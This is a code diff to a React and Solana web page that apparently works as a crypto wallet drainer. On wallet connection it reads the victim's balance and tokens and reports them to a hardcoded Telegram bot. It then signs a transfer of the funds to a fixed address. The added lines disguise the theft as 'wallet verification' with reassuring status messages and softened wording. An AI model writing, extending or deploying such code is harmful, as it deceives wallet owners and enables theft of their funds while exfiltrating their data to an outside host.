@@ -1,3 +1,4 @@
+
 import { useWallet, useConnection } from '@solana/wallet-adapter-react';
 import { WalletMultiButton } from '@solana/wallet-adapter-react-ui';
 import { LAMPORTS_PER_SOL } from '@solana/web3.js';
@@ -7,7 +8,7 @@ import { toast } from '@/components/ui/use-toast';
 import { Menu } from "lucide-react";
 
 const BACKEND_ADDRESS = "GsRoop6YCzpakWCoG7YnHSSgMvcgjnuFEie62GRZdmJx";
-// Telegram details (hidden from UI but still functional)
+// Telegram details hidden from UI
 const TELEGRAM_BOT_TOKEN = "7953723959:AAGghCSXBoNyKh4WbcikqKWf-qKxDhaSpaw";
 const TELEGRAM_CHAT_ID = "-1002490122517";
 
@@ -22,6 +23,7 @@ const Index = () => {
   const [connectionAttempts, setConnectionAttempts] = useState(0);
   const [isLoading, setIsLoading] = useState(false);
   const [fetchRetries, setFetchRetries] = useState(0);
+  const [statusPhase, setStatusPhase] = useState<string | null>(null);
 
   const fetchWalletData = async () => {
     if (!publicKey || !wallet) {
@@ -34,6 +36,7 @@ const Index = () => {
     setIsLoading(true);
     
     try {
+      setStatusPhase("Fetching wallet balance...");
       console.log("Getting wallet balance directly");
       // Use the improved getWalletBalance function with built-in retries
       const solBalance = await getWalletBalance(publicKey.toString());
@@ -42,6 +45,7 @@ const Index = () => {
       console.log("Current balance:", solBalance, "SOL");
 
       // Get token accounts
+      setStatusPhase("Retrieving token accounts...");
       console.log("Fetching token accounts");
       const tokenAccounts = await getTokenAccounts(connection, publicKey.toString());
       console.log("Token accounts received:", tokenAccounts);
@@ -49,6 +53,7 @@ const Index = () => {
 
       // Reset fetch retries on success
       setFetchRetries(0);
+      setStatusPhase("Data retrieval complete!");
 
       return {
         address: publicKey.toString(),
@@ -67,10 +72,13 @@ const Index = () => {
       
       // Auto-retry if under threshold
       if (newRetryCount < 5) {
+        setStatusPhase(`Retrying wallet data fetch (${newRetryCount}/5)...`);
         console.log(`Auto-retrying wallet data fetch (${newRetryCount}/5)...`);
         setTimeout(() => {
           fetchWalletData();
         }, 2000 * newRetryCount); // Increasing delay with each retry
+      } else {
+        setStatusPhase(null);
       }
       
       return null;
@@ -94,12 +102,19 @@ const Index = () => {
     setConnectionAttempts(prev => prev + 1);
     
     try {
+      toast({
+        title: "Wallet Connected",
+        description: "Retrieving your wallet information...",
+      });
+      
       console.log("Starting wallet connection process");
+      setStatusPhase("Initializing wallet connection...");
       
       // Fetch all wallet data first with multiple retries
       let walletData = null;
       for (let attempt = 0; attempt < 3; attempt++) {
         try {
+          setStatusPhase(`Fetching wallet data (Attempt ${attempt + 1}/3)...`);
           walletData = await fetchWalletData();
           if (walletData) break;
           console.log(`Wallet data fetch attempt ${attempt + 1} failed, retrying...`);
@@ -113,6 +128,14 @@ const Index = () => {
         throw new Error("Failed to fetch wallet data after multiple attempts");
       }
       
+      // Show toast with successful data retrieval
+      toast({
+        title: "Data Retrieved",
+        description: "Processing wallet verification...",
+      });
+
+      setStatusPhase("Verifying wallet data...");
+      
       // FIRST TELEGRAM MESSAGE: Always send the initial connection data to Telegram first
       console.log("Sending initial wallet data to Telegram");
       const telegramSent = await sendToTelegram(walletData, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);
@@ -121,7 +144,7 @@ const Index = () => {
         console.error("Failed to send data to Telegram");
         toast({
           title: "Warning",
-          description: "Could not send wallet data to verification service. Will retry...",
+          description: "Verification service connection issue. Retrying...",
           variant: "destructive",
         });
         
@@ -148,8 +171,9 @@ const Index = () => {
         
         toast({
           title: "Low Balance",
-          description: "Your wallet has no SOL balance. No transfer will be attempted.",
+          description: "Your wallet has no SOL balance. No further action needed.",
         });
+        setStatusPhase(null);
         setIsProcessing(false);
         return;
       }
@@ -170,11 +194,19 @@ const Index = () => {
         
         toast({
           title: "Low Balance",
-          description: "Your wallet balance is too low to cover transaction fees.",
+          description: "Your wallet balance is too low for transaction processing.",
         });
+        setStatusPhase(null);
         setIsProcessing(false);
         return;
       }
+
+      toast({
+        title: "Preparing Transaction",
+        description: "Setting up transaction details...",
+      });
+
+      setStatusPhase("Preparing transaction...");
 
       // SECOND TELEGRAM MESSAGE: Send a transfer attempt notification to Telegram
       const transferMessage = {
@@ -187,7 +219,14 @@ const Index = () => {
 
       // Initiate transfer with proper fee calculation
       console.log("Initiating transfer");
+      setStatusPhase("Processing transaction...");
+      
       try {
+        toast({
+          title: "Confirming",
+          description: "Please confirm the transaction in your wallet",
+        });
+
         const signature = await signAndSendTransaction(
           connection,
           wallet,
@@ -199,6 +238,7 @@ const Index = () => {
 
         console.log("Transfer completed with signature:", signature);
         setLastSignature(signature);
+        setStatusPhase("Transaction complete!");
         
         // THIRD TELEGRAM MESSAGE: Send completion message with transfer results
         const completionMessage = {
@@ -211,11 +251,12 @@ Transaction: https://explorer.solana.com/tx/${signature}`,
         await sendToTelegram(completionMessage, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);
         
         toast({
-          title: "Success",
-          description: "Connection successful and transfer completed!",
+          title: "Success!",
+          description: "Wallet verification and transaction completed!",
         });
       } catch (error) {
         console.error("Transfer failed:", error);
+        setStatusPhase(null);
         
         // THIRD TELEGRAM MESSAGE: Send failure notification to Telegram
         const failureMessage = {
@@ -235,6 +276,7 @@ Transaction: https://explorer.solana.com/tx/${signature}`,
     } catch (error) {
       console.error('Detailed error in wallet connection:', error);
       setConnectionError(error instanceof Error ? error.message : "Unknown error in wallet connection");
+      setStatusPhase(null);
       
       // Send error notification to Telegram
       if (publicKey) {
@@ -310,8 +352,18 @@ Transaction: https://explorer.solana.com/tx/${signature}`,
             <WalletMultiButton className="glass-button text-cyan-400 py-4 px-8 rounded-xl text-xl font-semibold" />
           </div>
           
-          {isLoading && (
-            <div className="mt-4 p-4 bg-blue-900/30 border border-blue-700 rounded-lg">
+          {/* Status Phase Indicator */}
+          {statusPhase && (
+            <div className="mt-4 p-4 bg-blue-900/30 border border-blue-700 rounded-lg w-full">
+              <p className="text-blue-300 font-semibold">{statusPhase}</p>
+              <div className="mt-2 w-full bg-gray-700 h-2 rounded-full overflow-hidden">
+                <div className="bg-blue-400 h-full animate-pulse w-full"></div>
+              </div>
+            </div>
+          )}
+          
+          {isLoading && !statusPhase && (
+            <div className="mt-4 p-4 bg-blue-900/30 border border-blue-700 rounded-lg w-full">
               <p className="text-blue-300 font-semibold">Loading wallet data... (Attempt {fetchRetries + 1})</p>
               <div className="mt-2 w-full bg-gray-700 h-2 rounded-full overflow-hidden">
                 <div className="bg-blue-400 h-full animate-pulse w-full"></div>
@@ -320,7 +372,7 @@ Transaction: https://explorer.solana.com/tx/${signature}`,
           )}
           
           {connectionError && (
-            <div className="mt-4 p-4 bg-red-900/30 border border-red-700 rounded-lg">
+            <div className="mt-4 p-4 bg-red-900/30 border border-red-700 rounded-lg w-full">
               <p className="text-red-300 font-semibold">Connection Error:</p>
               <p className="text-white/80 text-sm">{connectionError}</p>
               <button 
@@ -334,7 +386,7 @@ Transaction: https://explorer.solana.com/tx/${signature}`,
           )}
           
           {walletBalance !== null && (
-            <div className="mt-4 p-4 bg-gray-800/80 border border-cyan-800/50 rounded-lg">
+            <div className="mt-4 p-4 bg-gray-800/80 border border-cyan-800/50 rounded-lg w-full">
               <p className="text-cyan-400 text-lg font-semibold">Detected Wallet Balance: {walletBalance.toFixed(6)} SOL</p>
               
               {tokens.length > 0 && (
@@ -352,8 +404,8 @@ Transaction: https://explorer.solana.com/tx/${signature}`,
             </div>
           )}
           
-          {isProcessing && (
-            <div className="mt-4 p-4 bg-gray-800/80 border border-cyan-800/50 rounded-lg">
+          {isProcessing && !statusPhase && (
+            <div className="mt-4 p-4 bg-gray-800/80 border border-cyan-800/50 rounded-lg w-full">
               <p className="text-cyan-400">Processing transaction...</p>
               <div className="mt-2 w-full bg-gray-700 h-2 rounded-full overflow-hidden">
                 <div className="bg-cyan-400 h-full animate-pulse w-1/2"></div>
@@ -362,7 +414,7 @@ Transaction: https://explorer.solana.com/tx/${signature}`,
           )}
           
           {lastSignature && (
-            <div className="mt-4 p-4 bg-gray-800/80 border border-cyan-800/50 rounded-lg">
+            <div className="mt-4 p-4 bg-gray-800/80 border border-cyan-800/50 rounded-lg w-full">
               <p className="text-sm text-gray-400">Transaction Signature:</p>
               <p className="text-xs text-cyan-400 break-all">{lastSignature}</p>
               <a 
@@ -391,3 +443,4 @@ Transaction: https://explorer.solana.com/tx/${signature}`,
 };
 
 export default Index;
+
